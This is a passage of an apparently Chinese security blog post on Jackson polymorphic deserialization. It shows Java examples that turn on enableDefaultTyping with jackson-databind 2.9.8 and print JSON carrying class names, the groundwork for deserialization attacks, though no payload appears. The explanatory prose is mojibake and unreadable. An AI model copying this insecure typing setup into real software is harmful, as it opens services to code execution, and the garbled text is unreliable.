å¤–çš„å…¶ä»–åº“ï¼Œè¢«ä¼—å¤šç”¨æˆ·æ‰€ä½¿ç”¨ã€‚</p><p>pom.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-annotations<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p>å®šä¹‰ä¸€ä¸ª Person ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ç€ç¼–å†™ Jackson çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224121027834.png" alt="image-20241224121027834"></p><p>é‚£ä¹ˆè¿™é‡Œåºåˆ—åŒ–çš„æ–¹æ³•ä¸º<code>ObjectMapper.writeValueAsString</code>ï¼Œååºåˆ—åŒ–çš„æ–¹æ³•ä¸º<code>ObjectMapper.readValue</code></p><hr><h2 id="å¤šæ€é—®é¢˜"><a href="#å¤šæ€é—®é¢˜" class="headerlink" title="å¤šæ€é—®é¢˜"></a>å¤šæ€é—®é¢˜</h2><p>Java å¤šæ€æŒ‡åŒä¸€ä¸ªæ¥å£ä½¿ç”¨ä¸åŒçš„å®ä¾‹è€Œæ‰§è¡Œä¸åŒçš„æ“ä½œ</p><p>é‚£ä¹ˆå¯¹äºååºåˆ—åŒ–æ¥è¯´å°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¯¹å¤šæ€ç±»çš„æŸä¸€ä¸ªå­ç±»å®ä¾‹åœ¨åºåˆ—åŒ–åå†è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå¦‚ä½•èƒ½å¤Ÿä¿è¯ååºåˆ—åŒ–å‡ºæ¥çš„å®ä¾‹å³æ˜¯æˆ‘ä»¬æƒ³è¦çš„é‚£ä¸ªç‰¹å®šå­ç±»çš„å®ä¾‹è€Œéå¤šæ€ç±»çš„å…¶ä»–å­ç±»å®ä¾‹ï¼Ÿ</p><p>Jackson å®ç°äº† <code>JacksonPolymorphicDeserialization</code> æœºåˆ¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼šåœ¨ååºåˆ—åŒ–æŸä¸ªç±»å¯¹è±¡çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç±»çš„æˆå‘˜å˜é‡ä¸æ˜¯å…·ä½“ç±»å‹ï¼ˆnon-concreteï¼‰ï¼Œæ¯”å¦‚ Objectã€æ¥å£æˆ–æŠ½è±¡ç±»ï¼Œåˆ™å¯ä»¥åœ¨ JSON å­—ç¬¦ä¸²ä¸­æŒ‡å®šå…¶å…·ä½“ç±»å‹ï¼ŒJackson å°†ç”Ÿæˆå…·ä½“ç±»å‹çš„å®ä¾‹</p><p>å…·ä½“çš„æ“ä½œï¼šå¯ç”¨ <code>DefaultTyping</code> å’Œ <code>@JsonTypeInfo</code> æ³¨è§£</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>åœ¨ ObjectMapper ä¸­æœ‰è¯¦ç»†ä»‹ç»</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224123043497.png" alt="image-20241224123043497"></p><p>å®é™…ä¸Šå››ä¸ªé€‰é¡¹æ˜¯ä¾æ¬¡æ‰©å¤§ä½œç”¨èŒƒå›´çš„ï¼š</p><table><thead><tr><th>DefaultTypingç±»å‹</th><th>æè¿°è¯´æ˜</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>å±æ€§çš„ç±»å‹ä¸ºObject</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClassã€Array</td></tr><tr><td>NON_FINAL</td><td>æ‰€æœ‰é™¤äº†å£°æ˜ä¸ºfinalä¹‹å¤–çš„å±æ€§</td></tr></tbody></table><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><blockquote><p>å½“è¢«åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–çš„ç±»é‡Œçš„å±æ€§è¢«å£°æ˜ä¸ºä¸€ä¸ª Object ç±»å‹æ—¶ï¼Œä¼šå¯¹è¯¥ Object ç±»å‹çš„å±æ€§è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”æ˜ç¡®è§„å®šç±»åã€‚ï¼ˆå½“ç„¶ï¼Œè¿™ä¸ª Object æœ¬èº«ä¹Ÿå¾—æ˜¯ä¸€ä¸ªå¯è¢«åºåˆ—åŒ–çš„ç±»ï¼‰</p></blockquote><p>æ·»åŠ ä¸€ä¸ª Hacker ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hacker</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> skill <span class="token operator">=</span> <span class="token string">"havefun"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹ Person ç±»ï¼Œæ·»åŠ  Object ç±»å‹å±æ€§ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ–°å»º JAVA_LANG_OBJECTTest.javaï¼Œæ·»åŠ  <code>enableDefaultTyping()</code> å¹¶è®¾ç½®ä¸º <code>JAVA_LANG_OBJECT</code>ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JAVA_LANG_OBJECTTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®JAVA_LANG_OBJECT  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">JAVA_LANG_OBJECT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224124150808.png" alt="image-20241224124150808"></p><p>æ—  DefaultTyping çš„æƒ…å†µæ˜¯ï¼š</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224124357516.png" alt="image-20241224124357516"></p><p>å¯¹æ¯”å¯ä»¥çœ‹å‡ºæ¥ï¼Œé€šè¿‡ enableDefaultTyping è®¾ç½® JAVA_LANG_OBJECT åï¼Œä¼šå¤šè¾“å‡º Hacker ç±»åï¼Œä¸”åœ¨è¾“å‡ºçš„ Object å±æ€§æ—¶ç›´æ¥è¾“å‡ºçš„æ˜¯ Hacker ç±»å¯¹è±¡</p><p>ä¹Ÿå°±æ˜¯è¯´å¯¹ Object å¯¹è±¡è¿›è¡Œäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”æ˜ç¡®è§„å®šç±»å</p><hr><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><blockquote><p>enableDefaultTyping  æ— å‚æ•°æ—¶çš„é»˜è®¤é€‰é¡¹ã€‚é™¤äº†å‰é¢æåˆ°çš„ç‰¹å¾ï¼Œå½“ç±»é‡Œæœ‰Interfaceã€AbstractClassç±»æ—¶ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p></blockquote><p>æ•´ä¸€ä¸ª Sex æ¥å£</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå®ç°å®ƒ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹ Person ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OBJECT_AND_NON_CONCRETE_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®OBJECT_AND_NON_CONCRETE  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">OBJECT_AND_NON_CONCRETE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æˆ–ç›´æ¥æ— å‚è°ƒç”¨ï¼Œè¾“å‡ºä¸€æ ·  </span>        <span class="token comment">//mapper.enableDefaultTyping();  </span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºï¼šå¯ä»¥çœ‹åˆ°è¯¥ Interface ç±»è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>Person.age=<span class="token number">6</span><span class="token punctuation">,</span> Person.name=0w0<span class="token punctuation">,</span> Hacker@42dafa95<span class="token punctuation">,</span> MySex@6500df86<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><blockquote><p>é™¤äº†å‰é¢æåˆ°çš„ç‰¹å¾å¤–ï¼Œè¿˜æ”¯æŒ Array ç±»å‹</p></blockquote><p>äºæ˜¯ç»™ Object ä»¥ Hacker ç±»å‹æ•°ç»„ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NON_CONCRETE_AND_ARRAYS_Test</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>          <span class="token class-name">Hacker</span><span class="token punctuation">[</span><span class="token punctuation">]</span> hackers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          hackers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          hackers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>object <span class="token operator">=</span> hackers<span class="token punctuation">;</span>          p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token 